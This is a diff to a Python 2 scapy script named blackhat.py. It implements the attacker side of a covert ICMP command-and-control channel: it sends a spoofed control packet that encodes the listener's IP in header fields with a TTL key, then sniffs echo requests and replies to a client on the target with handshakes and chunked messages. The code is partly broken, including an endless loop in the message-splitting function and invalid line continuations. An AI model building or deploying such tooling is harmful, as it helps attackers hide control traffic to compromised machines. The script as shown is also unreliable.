@@ -3,10 +3,13 @@ import time
 import random
 from scapy.all import *
 import socket
+import math
 
-
-
+#Maximum transmit size is 40 bytes
+MTU = 10
 ## Helper Functions
+
+
 
 #Function takes in IP identification field & TCP source port data as ints, and then deconstructs them
 # to construct the IP address
@@ -57,7 +60,7 @@ def padPartition(partition):
     return partition
 
 
-def craftControlPacket(option,targetIP,listeningIP,spoofedIP, TTLkey):
+def craftControlPacket(targetIP,listeningIP,spoofedIP, TTLkey):
 
     #1.A Split first 8 bits of IP address into the IP identification field
     print(listeningIP)
@@ -96,47 +99,114 @@ def craftControlPacket(option,targetIP,listeningIP,spoofedIP, TTLkey):
     # return pkt
     return pkt
 
+def craftReplyPacket(clientIP,localIP,message):
+    packet = IP(dst=clientIP,src=localIP)/ICMP(type=0, seq=1)/message
+    return packet
+
+def encapsulateMessage(message,numPackets):
+    #get length of the message  e.g. (18)
+    messageLength = len(message)
+    MTU = 10
+    packets = numPackets
+    letter = 0;
+    row = 0
+    packetsArray = []
+
+    while letter < messageLength:
+            letterStart = letter;
+            letterEnd = letter + MTU;
+            if letterEnd < messageLength:
+                packetsArray.append(message[letterStart:letterEnd])
+                letter = letterEnd
+            else:
+                packetsArray.append(message[letterStart:messageLength])
+    print "Inside method " + str(packetsArray)
+    return packetsArray;
 
 def server(packet):
-    # print len(packet)
-    print packet.show();
-    # print "BOUNDARY \n"
-    # print packet[0].show()
-    # print "BOUNDARY \n"
-    #ICMPpacket = packet[1].show()
+    #print packet.show();
 
+    #EXPECTING HANDSHAKE:
+    #Check to ensure that we've received a proper packet (Unknown errors if dont)
     if hasattr(packet.payload, "src"):
         print "TRUE!"
         print str(packet.payload.src)
-        ICMPdata = packet.getlayer(Raw)
-        print "Message: " + str(ICMPdata) + " from SRC: " + str(packet.payload.src)
-
-        #send a reply blackhat
-        send(IP(dst=str(packet.payload.src),src=str(packet.payload.dst))/ICMP(type=0, seq=1)/"HANDSHAKESUCCESS![1]")
-
-        print "Handshake reply sent"
+        ICMPdata = str(packet.getlayer(Raw))
+        paddedData = str(packet.getlayer(Padding))
+        ICMPdata = ICMPdata.decode('utf8')
+        localIP = str(packet.payload.dst);
+        clientIP = str(packet.payload.src)
 
 
-    else:
-        print "NO TCP SOURCE ?!"
+        #Handle messages from client
 
-# Main
+        #INITIAL HANDSHAKE --
+        clientMessage = ICMPdata.strip(paddedData)
+        if clientMessage == "HANDSHAKE":
+            print "--HANDSHAKE RECEIVED-- from SRC: " + str(packet.payload.src)
+
+            userInput = input("Connection Established \n"
+            + "What would you like to do?"
+            +" Enter [1] to send a message, or [2] to continue listening")
+
+            if userInput ==str(0):
+                #send a reply blackhat
+                send(craftReplyPacket(clientIP,localIP,"HSS[0]"))
+                print "HANDSHAKE REPLY sent with INTENT: Ready 2 receive."
+
+            else:
+                send(craftReplyPacket(clientIP,localIP,"HSS[1]"))
+                print "HANDSHAKE REPLY sent with INTENT to SEND"
+
+        #Client is querying for number of messages?
+        elif clientMessage == "4":
+            userInput = input("CLIENT: Query- Length of message? \n"
+            + "Please enter what message you would like to send the client.")
+
+            #encapsulate the message here, get back packetarray
+            msgLength = len(str(userInput))
+            msgsRequired = (int(msgLength)/MTU) + (int(msgLength) % MTU > 0)
+            encapsulateMessage(userInput,msgsRequired)
+
+            print str(msgsRequired)
+            print "Msg length is " + str(msgLength) + ", MTU is " + str(MTU) + "& num msgs reqd is " + str(msgsRequired)
+
+            #Prepare the message
+
+
+            #Answer client query: Numb of messages that will be required to facilitate transfer
+            send(craftReplyPacket(clientIP,localIP,str(msgsRequired)))
+
+        #BLACKHAT PUSHING --
+        elif str(clientMessage[0]) == "1":
+
+            msgData = re.search(r"\[([A-Za-z0-9_]+)\]", clientMessage);
+            msgNumber = msgData.group(1)
+            print "Client wants you to send message" + str(msgNumber)
+            #print packetsArray
+
+
+# ============================================ MAIN ========================== #
 print 'Number of arguments:', len(sys.argv), 'arguments.'
 print 'Argument List:', str(sys.argv)
 
-if len(sys.argv) < 6:
-    print "Please enter commands in format python blackhat.py <Mode> <TargetIP> <BlackhatIP> <SpoofedIP> <TTLkey>"
+#Check arguments. Ensure user enters in all information
+if len(sys.argv) < 5:
+    print "Please enter commands in format:"
+    + "python blackhat.py <Mode> <TargetIP> <BlackhatIP> <SpoofedIP> <TTLkey>"
     sys.exit()
 
 #Assign Variables
-option = sys.argv[1]
-targetIP = sys.argv[2]
-listeningIP = sys.argv[3]
-spoofedIP = sys.argv[4]
-TTLkey = int(sys.argv[5])
+targetIP = sys.argv[1]
+listeningIP = sys.argv[2]
+spoofedIP = sys.argv[3]
+TTLkey = int(sys.argv[4])
+global packetsArray
 
-if option == "1":
-    send(craftControlPacket(option, targetIP, listeningIP, spoofedIP, TTLkey));
-    sniff(filter="host 192.168.0.18 and icmp[0]=8", prn=server)
-else:
-    print "Something else"
+
+#Program start, blackhat wants to send a control packet to initialize connection.
+send(craftControlPacket(targetIP, listeningIP, spoofedIP, TTLkey));
+#After the control packet has been sent, the client now has where to reach the
+#blackhat server. Program enters into server() state. Blackhat is expecting
+# ICMP packets to this address with a code of 8 (ECHO-REQUEST)
+sniff(filter="host "+listeningIP +" and icmp[0]=8", prn=server)
